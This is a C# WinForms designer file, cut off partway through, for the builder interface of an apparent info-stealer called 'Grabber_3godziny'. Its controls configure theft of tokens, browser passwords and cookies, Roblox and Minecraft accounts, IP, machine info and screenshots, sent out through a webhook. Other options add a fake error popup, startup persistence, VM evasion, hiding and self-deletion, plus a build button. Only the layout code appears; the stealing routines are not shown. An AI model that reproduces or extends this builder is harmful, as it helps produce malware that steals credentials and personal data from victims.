﻿
namespace _3godziny_grabber
{
    partial class Form1
    {
        /// <summary>
        /// Wymagana zmienna projektanta.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Wyczyść wszystkie używane zasoby.
        /// </summary>
        /// <param name="disposing">prawda, jeżeli zarządzane zasoby powinny zostać zlikwidowane; Fałsz w przeciwnym wypadku.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Kod generowany przez Projektanta formularzy systemu Windows

        /// <summary>
        /// Metoda wymagana do obsługi projektanta — nie należy modyfikować
        /// jej zawartości w edytorze kodu.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.panel1 = new System.Windows.Forms.Panel();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.label5 = new System.Windows.Forms.Label();
            this.compiler = new System.Windows.Forms.Button();
            this.grabb = new System.Windows.Forms.Button();
            this.opcje = new System.Windows.Forms.Button();
            this.setup = new System.Windows.Forms.Button();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.panel3 = new System.Windows.Forms.Panel();
            this.button7 = new System.Windows.Forms.Button();
            this.button5 = new System.Windows.Forms.Button();
            this.msg = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.quest = new System.Windows.Forms.RadioButton();
            this.Error = new System.Windows.Forms.RadioButton();
            this.Normal = new System.Windows.Forms.RadioButton();
            this.button3 = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.title = new System.Windows.Forms.TextBox();
            this.panel2 = new System.Windows.Forms.Panel();
            this.button8 = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.panel8 = new System.Windows.Forms.Panel();
            this.Screenshot = new System.Windows.Forms.CheckBox();
            this.label10 = new System.Windows.Forms.Label();
            this.minfo = new System.Windows.Forms.CheckBox();
            this.ip = new System.Windows.Forms.CheckBox();
            this.panel6 = new System.Windows.Forms.Panel();
            this.label8 = new System.Windows.Forms.Label();
            this.Roblox = new System.Windows.Forms.CheckBox();
            this.Minecraft = new System.Windows.Forms.CheckBox();
            this.panel5 = new System.Windows.Forms.Panel();
            this.Disable = new System.Windows.Forms.CheckBox();
            this.label7 = new System.Windows.Forms.Label();
            this.Cookies = new System.Windows.Forms.CheckBox();
            this.pass = new System.Windows.Forms.CheckBox();
            this.panel4 = new System.Windows.Forms.Panel();
            this.qr = new System.Windows.Forms.CheckBox();
            this.label6 = new System.Windows.Forms.Label();
            this.Info = new System.Windows.Forms.CheckBox();
            this.Token = new System.Windows.Forms.CheckBox();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.panel11 = new System.Windows.Forms.Panel();
            this.Hidden = new System.Windows.Forms.CheckBox();
            this.label13 = new System.Windows.Forms.Label();
            this.dell = new System.Windows.Forms.CheckBox();
            this.vm = new System.Windows.Forms.CheckBox();
            this.panel10 = new System.Windows.Forms.Panel();
            this.start = new System.Windows.Forms.CheckBox();
            this.Luq = new System.Windows.Forms.CheckBox();
            this.label12 = new System.Windows.Forms.Label();
            this.Fat = new System.Windows.Forms.CheckBox();
            this.Mgr = new System.Windows.Forms.CheckBox();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.buildButton = new System.Windows.Forms.Button();
            this.panel9 = new System.Windows.Forms.Panel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.button6 = new System.Windows.Forms.Button();
            this.label11 = new System.Windows.Forms.Label();
            this.textBox5 = new System.Windows.Forms.TextBox();
            this.panel7 = new System.Windows.Forms.Panel();
            this.button4 = new System.Windows.Forms.Button();
            this.label9 = new System.Windows.Forms.Label();
            this.textBox4 = new System.Windows.Forms.TextBox();
            this.panel1.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.panel3.SuspendLayout();
            this.panel2.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.panel8.SuspendLayout();
            this.panel6.SuspendLayout();
            this.panel5.SuspendLayout();
            this.panel4.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.panel11.SuspendLayout();
            this.panel10.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.panel9.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.panel7.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.panel1.Controls.Add(this.button2);
            this.panel1.Controls.Add(this.button1);
            this.panel1.Controls.Add(this.label5);
            this.panel1.Location = new System.Drawing.Point(-2, -2);
            this.panel1.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(866, 60);
            this.panel1.TabIndex = 20;
            this.panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.panel1_Paint);
            // 
            // button2
            // 
            this.button2.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.button2.BackColor = System.Drawing.Color.Firebrick;
            this.button2.FlatAppearance.BorderSize = 0;
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Font = new System.Drawing.Font("Microsoft YaHei", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.button2.Location = new System.Drawing.Point(802, 8);
            this.button2.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(50, 45);
            this.button2.TabIndex = 21;
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.button1.BackColor = System.Drawing.Color.Firebrick;
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft YaHei", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.button1.Location = new System.Drawing.Point(942, 8);
            this.button1.Margin = new System.Windows.Forms.Padding(6, 8, 6, 8);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(84, 60);
            this.button1.TabIndex = 20;
            this.button1.UseVisualStyleBackColor = false;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Segoe UI", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label5.ForeColor = System.Drawing.Color.Crimson;
            this.label5.Location = new System.Drawing.Point(16, 11);
            this.label5.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(255, 38);
            this.label5.TabIndex = 19;
            this.label5.Text = "Grabber_3godziny";
            // 
            // compiler
            // 
            this.compiler.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.compiler.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.compiler.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.compiler.ForeColor = System.Drawing.Color.Crimson;
            this.compiler.Location = new System.Drawing.Point(4, 414);
            this.compiler.Name = "compiler";
            this.compiler.Size = new System.Drawing.Size(178, 74);
            this.compiler.TabIndex = 27;
            this.compiler.Text = "Compiler";
            this.compiler.UseVisualStyleBackColor = true;
            this.compiler.Click += new System.EventHandler(this.compiler_Click);
            // 
            // grabb
            // 
            this.grabb.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.grabb.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.grabb.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.grabb.ForeColor = System.Drawing.Color.Crimson;
            this.grabb.Location = new System.Drawing.Point(4, 182);
            this.grabb.Name = "grabb";
            this.grabb.Size = new System.Drawing.Size(178, 74);
            this.grabb.TabIndex = 26;
            this.grabb.Text = "Grabb";
            this.grabb.UseVisualStyleBackColor = true;
            this.grabb.Click += new System.EventHandler(this.grabb_Click);
            // 
            // opcje
            // 
            this.opcje.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.opcje.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.opcje.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.opcje.ForeColor = System.Drawing.Color.Crimson;
            this.opcje.Location = new System.Drawing.Point(4, 278);
            this.opcje.Name = "opcje";
            this.opcje.Size = new System.Drawing.Size(178, 74);
            this.opcje.TabIndex = 25;
            this.opcje.Text = "Options";
            this.opcje.UseVisualStyleBackColor = true;
            this.opcje.Click += new System.EventHandler(this.opcje_Click);
            // 
            // setup
            // 
            this.setup.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.setup.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.setup.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.setup.ForeColor = System.Drawing.Color.Crimson;
            this.setup.Location = new System.Drawing.Point(4, 82);
            this.setup.Name = "setup";
            this.setup.Size = new System.Drawing.Size(178, 74);
            this.setup.TabIndex = 24;
            this.setup.Text = "Setup";
            this.setup.UseVisualStyleBackColor = true;
            this.setup.Click += new System.EventHandler(this.setup_Click);
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.Location = new System.Drawing.Point(184, 62);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(680, 465);
            this.tabControl1.TabIndex = 28;
            // 
            // tabPage1
            // 
            this.tabPage1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(11)))), ((int)(((byte)(7)))), ((int)(((byte)(17)))));
            this.tabPage1.Controls.Add(this.panel3);
            this.tabPage1.Controls.Add(this.panel2);
            this.tabPage1.Location = new System.Drawing.Point(4, 29);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3, 3, 3, 3);
            this.tabPage1.Size = new System.Drawing.Size(672, 432);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "tabPage1";
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel3.Controls.Add(this.button7);
            this.panel3.Controls.Add(this.button5);
            this.panel3.Controls.Add(this.msg);
            this.panel3.Controls.Add(this.label4);
            this.panel3.Controls.Add(this.label3);
            this.panel3.Controls.Add(this.quest);
            this.panel3.Controls.Add(this.Error);
            this.panel3.Controls.Add(this.Normal);
            this.panel3.Controls.Add(this.button3);
            this.panel3.Controls.Add(this.label2);
            this.panel3.Controls.Add(this.title);
            this.panel3.ForeColor = System.Drawing.SystemColors.ScrollBar;
            this.panel3.Location = new System.Drawing.Point(18, 154);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(634, 260);
            this.panel3.TabIndex = 1;
            // 
            // button7
            // 
            this.button7.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button7.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button7.ForeColor = System.Drawing.Color.Crimson;
            this.button7.Location = new System.Drawing.Point(338, 222);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(90, 34);
            this.button7.TabIndex = 13;
            this.button7.Text = "OFF";
            this.button7.UseVisualStyleBackColor = true;
            this.button7.Click += new System.EventHandler(this.button7_Click);
            // 
            // button5
            // 
            this.button5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button5.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button5.ForeColor = System.Drawing.Color.Crimson;
            this.button5.Location = new System.Drawing.Point(434, 222);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(90, 34);
            this.button5.TabIndex = 12;
            this.button5.Text = "Test";
            this.button5.UseVisualStyleBackColor = true;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // msg
            // 
            this.msg.BackColor = System.Drawing.Color.Crimson;
            this.msg.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.msg.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.msg.Location = new System.Drawing.Point(195, 123);
            this.msg.Multiline = true;
            this.msg.Name = "msg";
            this.msg.Size = new System.Drawing.Size(424, 94);
            this.msg.TabIndex = 11;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label4.ForeColor = System.Drawing.Color.Crimson;
            this.label4.Location = new System.Drawing.Point(189, 89);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(66, 31);
            this.label4.TabIndex = 10;
            this.label4.Text = "Msg:";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label3.ForeColor = System.Drawing.Color.Crimson;
            this.label3.Location = new System.Drawing.Point(189, 9);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(68, 31);
            this.label3.TabIndex = 9;
            this.label3.Text = "Title:";
            // 
            // quest
            // 
            this.quest.AutoSize = true;
            this.quest.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.quest.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.quest.ForeColor = System.Drawing.Color.Crimson;
            this.quest.Location = new System.Drawing.Point(16, 140);
            this.quest.Name = "quest";
            this.quest.Size = new System.Drawing.Size(97, 34);
            this.quest.TabIndex = 8;
            this.quest.TabStop = true;
            this.quest.Text = "Quest";
            this.quest.UseVisualStyleBackColor = true;
            // 
            // Error
            // 
            this.Error.AutoSize = true;
            this.Error.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Error.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Error.ForeColor = System.Drawing.Color.Crimson;
            this.Error.Location = new System.Drawing.Point(16, 100);
            this.Error.Name = "Error";
            this.Error.Size = new System.Drawing.Size(88, 34);
            this.Error.TabIndex = 7;
            this.Error.TabStop = true;
            this.Error.Text = "Error";
            this.Error.UseVisualStyleBackColor = true;
            // 
            // Normal
            // 
            this.Normal.AutoSize = true;
            this.Normal.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Normal.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Normal.ForeColor = System.Drawing.Color.Crimson;
            this.Normal.Location = new System.Drawing.Point(16, 60);
            this.Normal.Name = "Normal";
            this.Normal.Size = new System.Drawing.Size(113, 34);
            this.Normal.TabIndex = 6;
            this.Normal.TabStop = true;
            this.Normal.Text = "Normal";
            this.Normal.UseVisualStyleBackColor = true;
            this.Normal.CheckedChanged += new System.EventHandler(this.Normal_CheckedChanged);
            // 
            // button3
            // 
            this.button3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.ForeColor = System.Drawing.Color.Crimson;
            this.button3.Location = new System.Drawing.Point(530, 222);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(90, 34);
            this.button3.TabIndex = 5;
            this.button3.Text = "OK";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label2.ForeColor = System.Drawing.Color.Crimson;
            this.label2.Location = new System.Drawing.Point(10, 11);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(128, 31);
            this.label2.TabIndex = 3;
            this.label2.Text = "Fake Error:";
            // 
            // title
            // 
            this.title.BackColor = System.Drawing.Color.Crimson;
            this.title.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.title.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.title.Location = new System.Drawing.Point(195, 43);
            this.title.Multiline = true;
            this.title.Name = "title";
            this.title.Size = new System.Drawing.Size(424, 34);
            this.title.TabIndex = 4;
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel2.Controls.Add(this.button8);
            this.panel2.Controls.Add(this.label1);
            this.panel2.Controls.Add(this.textBox1);
            this.panel2.Location = new System.Drawing.Point(18, 25);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(634, 108);
            this.panel2.TabIndex = 0;
            // 
            // button8
            // 
            this.button8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button8.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button8.ForeColor = System.Drawing.Color.Crimson;
            this.button8.Location = new System.Drawing.Point(530, 63);
            this.button8.Name = "button8";
            this.button8.Size = new System.Drawing.Size(90, 34);
            this.button8.TabIndex = 14;
            this.button8.Text = "Test";
            this.button8.UseVisualStyleBackColor = true;
            this.button8.Click += new System.EventHandler(this.button8_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label1.ForeColor = System.Drawing.Color.Crimson;
            this.label1.Location = new System.Drawing.Point(10, 11);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(169, 31);
            this.label1.TabIndex = 3;
            this.label1.Text = "Webhook test:";
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.Color.Crimson;
            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox1.Location = new System.Drawing.Point(16, 63);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(507, 34);
            this.textBox1.TabIndex = 4;
            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(11)))), ((int)(((byte)(7)))), ((int)(((byte)(17)))));
            this.tabPage2.Controls.Add(this.panel8);
            this.tabPage2.Controls.Add(this.panel6);
            this.tabPage2.Controls.Add(this.panel5);
            this.tabPage2.Controls.Add(this.panel4);
            this.tabPage2.Location = new System.Drawing.Point(4, 29);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3, 3, 3, 3);
            this.tabPage2.Size = new System.Drawing.Size(672, 432);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "tabPage2";
            // 
            // panel8
            // 
            this.panel8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel8.Controls.Add(this.Screenshot);
            this.panel8.Controls.Add(this.label10);
            this.panel8.Controls.Add(this.minfo);
            this.panel8.Controls.Add(this.ip);
            this.panel8.Location = new System.Drawing.Point(362, 6);
            this.panel8.Name = "panel8";
            this.panel8.Size = new System.Drawing.Size(280, 208);
            this.panel8.TabIndex = 4;
            // 
            // Screenshot
            // 
            this.Screenshot.AutoSize = true;
            this.Screenshot.Checked = true;
            this.Screenshot.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Screenshot.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Screenshot.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Screenshot.ForeColor = System.Drawing.Color.Crimson;
            this.Screenshot.Location = new System.Drawing.Point(20, 111);
            this.Screenshot.Name = "Screenshot";
            this.Screenshot.Size = new System.Drawing.Size(127, 29);
            this.Screenshot.TabIndex = 7;
            this.Screenshot.Text = "Screenshot";
            this.Screenshot.UseVisualStyleBackColor = true;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label10.ForeColor = System.Drawing.Color.Crimson;
            this.label10.Location = new System.Drawing.Point(3, 0);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(96, 31);
            this.label10.TabIndex = 6;
            this.label10.Text = "General";
            // 
            // minfo
            // 
            this.minfo.AutoSize = true;
            this.minfo.Checked = true;
            this.minfo.CheckState = System.Windows.Forms.CheckState.Checked;
            this.minfo.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.minfo.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.minfo.ForeColor = System.Drawing.Color.Crimson;
            this.minfo.Location = new System.Drawing.Point(18, 75);
            this.minfo.Name = "minfo";
            this.minfo.Size = new System.Drawing.Size(146, 29);
            this.minfo.TabIndex = 5;
            this.minfo.Text = "Machine Info";
            this.minfo.UseVisualStyleBackColor = true;
            // 
            // ip
            // 
            this.ip.AutoSize = true;
            this.ip.Checked = true;
            this.ip.CheckState = System.Windows.Forms.CheckState.Checked;
            this.ip.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ip.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.ip.ForeColor = System.Drawing.Color.Crimson;
            this.ip.Location = new System.Drawing.Point(20, 45);
            this.ip.Name = "ip";
            this.ip.Size = new System.Drawing.Size(50, 29);
            this.ip.TabIndex = 4;
            this.ip.Text = "Ip";
            this.ip.UseVisualStyleBackColor = true;
            // 
            // panel6
            // 
            this.panel6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel6.Controls.Add(this.label8);
            this.panel6.Controls.Add(this.Roblox);
            this.panel6.Controls.Add(this.Minecraft);
            this.panel6.Location = new System.Drawing.Point(362, 211);
            this.panel6.Name = "panel6";
            this.panel6.Size = new System.Drawing.Size(280, 215);
            this.panel6.TabIndex = 3;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label8.ForeColor = System.Drawing.Color.Crimson;
            this.label8.Location = new System.Drawing.Point(3, 0);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(75, 31);
            this.label8.TabIndex = 6;
            this.label8.Text = "Game";
            // 
            // Roblox
            // 
            this.Roblox.AutoSize = true;
            this.Roblox.Checked = true;
            this.Roblox.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Roblox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Roblox.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Roblox.ForeColor = System.Drawing.Color.Crimson;
            this.Roblox.Location = new System.Drawing.Point(20, 80);
            this.Roblox.Name = "Roblox";
            this.Roblox.Size = new System.Drawing.Size(157, 29);
            this.Roblox.TabIndex = 5;
            this.Roblox.Text = "Roblox Stealer";
            this.Roblox.UseVisualStyleBackColor = true;
            // 
            // Minecraft
            // 
            this.Minecraft.AutoSize = true;
            this.Minecraft.Checked = true;
            this.Minecraft.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Minecraft.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Minecraft.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Minecraft.ForeColor = System.Drawing.Color.Crimson;
            this.Minecraft.Location = new System.Drawing.Point(20, 45);
            this.Minecraft.Name = "Minecraft";
            this.Minecraft.Size = new System.Drawing.Size(180, 29);
            this.Minecraft.TabIndex = 4;
            this.Minecraft.Text = "Minecraft Stealer";
            this.Minecraft.UseVisualStyleBackColor = true;
            // 
            // panel5
            // 
            this.panel5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(5)))), ((int)(((byte)(10)))));
            this.panel5.Controls.Add(this.Disable);
            this.panel5.Controls.Add(this.label7);
            this.panel5.Controls.Add(this.Cookies);
            this.panel5.Controls.Add(this.pass);
            this.panel5.Location = new System.Drawing.Point(3, 211);
            this.panel5.Name = "panel5";
            this.panel5.Size = new System.Drawing.Size(294, 215);
            this.panel5.TabIndex = 2;
            // 
            // Disable
            // 
            this.Disable.AutoSize = true;
            this.Disable.Checked = true;
            this.Disable.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Disable.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Disable.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Disable.ForeColor = System.Drawing.Color.Crimson;
            this.Disable.Location = new System.Drawing.Point(20, 114);
            this.Disable.Name = "Disable";
            this.Disable.Size = new System.Drawing.Size(95, 29);
            this.Disable.TabIndex = 7;
            this.Disable.Text = "Disable";
            this.Disable.UseVisualStyleBackColor = true;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label7.ForeColor = System.Drawing.Color.Crimson;
            this.label7.Location = new System.Drawing.Point(3, 0);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(101, 31);
            this.label7.TabIndex = 6;
            this.label7.Text = "Browser";
            // 
            // Cookies
            // 
            this.Cookies.AutoSize = true;
            this.Cookies.Checked = true;
            this.Cookies.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Cookies.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Cookies.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Cookies.ForeColor = System.Drawing.Color.Crimson;
            this.Cookies.Location = new System.Drawing.Point(20, 78);
            this.Cookies.Name = "Cookies";
            this.Cookies.Size = new System.Drawing.Size(99, 29);
            this.Cookies.TabIndex = 5;
            this.Cookies.Text = "Cookies";
            this.Cookies.UseVisualStyleBackColor = true;
            // 
            // pass
            // 
            this.pass.AutoSize = true;
            this.pass.Checked = true;
            this.pass.CheckState = System.Windows.Forms.CheckState.Checked;
